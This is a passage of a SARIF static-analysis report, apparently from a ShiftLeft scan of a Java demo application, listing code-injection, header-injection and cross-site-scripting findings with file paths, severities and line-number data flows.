                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 34
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 35
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 36
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/AdminController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "e601a7b967a6400b926188d0b39772784854390506017bda52ab95fdab9133ec"
          },
          "ruleId": "deserialization-attacker-controlled",
          "ruleIndex": 9
        },
        {
          "message": {
            "markdown": "Remote Code Execution: Code Injection Through Attacker-controlled Data via `foo` in `SearchController.doGetSearch`",
            "text": "Remote Code Execution: Code Injection Through Attacker-controlled Data via foo in SearchController.doGetSearch"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 25
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 21
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 25
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "e4b1c82b3c6854b1bc672f52629a68440b681d7cea3895ab8824830a296989c7"
          },
          "ruleId": "code-injection-attacker-controlled",
          "ruleIndex": 10
        },
        {
          "message": {
            "markdown": "Header Injection: Attacker-Controlled Data Used in HTTP Header via `request` in `CustomerController.createCustomer`",
            "text": "Header Injection: Attacker-Controlled Data Used in HTTP Header via request in CustomerController.createCustomer"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 350
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 344
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 350
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "3b8c8c765ab84cb66d5a56ac7abf6e07f226a6beb1909c3ac7a1ee4bffe13cf7"
          },
          "ruleId": "attacker-to-httpHeader",
          "ruleIndex": 11
        },
        {
          "message": {
            "markdown": "Header Injection: Attacker-Controlled Data Used in HTTP Header via `request` in `CustomerController.loadSettings`",
            "text": "Header Injection: Attacker-Controlled Data Used in HTTP Header via request in CustomerController.loadSettings"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 205
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 183
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 189
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 205
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "3aa36536624582892412543daceb51a012157f542dc03c0e02e67372ad5dd473"
          },
          "ruleId": "attacker-to-httpHeader",
          "ruleIndex": 11
        },
        {
          "message": {
            "markdown": "Header Injection: Attacker-Controlled Data Used in HTTP Header via `request` in `CustomerController.debug`",
            "text": "Header Injection: Attacker-Controlled Data Used in HTTP Header via request in CustomerController.debug"
          },
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 303
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "MODERATE",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 291
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 304
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 303
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "4d160ffd0ec536e104910d1dcb97f643de29699b9db13f462e66fb2d6e2bff54"
          },
          "ruleId": "attacker-to-httpHeader",
          "ruleIndex": 11
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `firstName` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via firstName in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 281
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 283
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 24
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "a219e941a98b9b1577c619184dafd012edf94c0d5f79e5c80d2915aff4a1b387"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `socialSecurityNum` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via socialSecurityNum in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 281
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 287
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 20
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 28
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 163
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "2b07ac8cee17c3cb149da7ed51ba56c5828e2fdc0c8a54fc6e09493f2c76815b"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `ssn` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via ssn in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 281
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 286
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 27
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 162
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "96c897217aca104d59917f26c1d460c915280f738cb545e0eba6cf416e45c284"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `foo` in `SearchController.doGetSearch`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via foo in SearchController.doGetSearch"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 30
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 21
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 25
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 26
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 30
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/SearchController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "59fcef55cb223c952961455bec9cd9c1b047b465f70e4bfbc4c3311fb214d7c0"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `lastName` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via lastName in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 281
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 284
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 25
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 162
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 161
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 160
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 281
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    }
                  ]
                }
              ]
            }
          ],
          "partialFingerprints": {
            "evidenceFingerprint": "2e3d5582ce87db224033c0373c94782fefd6f384cd47d9496fcb963f496d77da"
          },
          "ruleId": "attacker-to-html",
          "ruleIndex": 12
        },
        {
          "message": {
            "markdown": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via `phoneNumber` in `CustomerController.debug`",
            "text": "Cross-Site Scripting: Attacker-Controlled Data Used as HTML Content via phoneNumber in CustomerController.debug"
          },
          "level": "error",
          "locations": [
            {
              "physicalLocation": {
                "region": {
                  "snippet": {
                    "text": ""
                  },
                  "startLine": 281
                },
                "artifactLocation": {
                  "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                }
              }
            }
          ],
          "properties": {
            "issue_confidence": "HIGH",
            "issue_severity": "CRITICAL",
            "issue_tags": {}
          },
          "baselineState": "unchanged",
          "codeFlows": [
            {
              "threadFlows": [
                {
                  "locations": [
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 289
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 297
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 20
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 30
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 19
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 296
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 306
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/controller/CustomerController.java"
                          }
                        }
                      }
                    },
                    {
                      "location": {
                        "physicalLocation": {
                          "region": {
                            "snippet": {
                              "text": ""
                            },
                            "startLine": 159
                          },
                          "artifactLocation": {
                            "uri": "file:///Users/elangosenthilnathan/Desktop/export-anima/src/main/java/io/shiftleft/model/Customer.java"
                          }
                        }
                      }
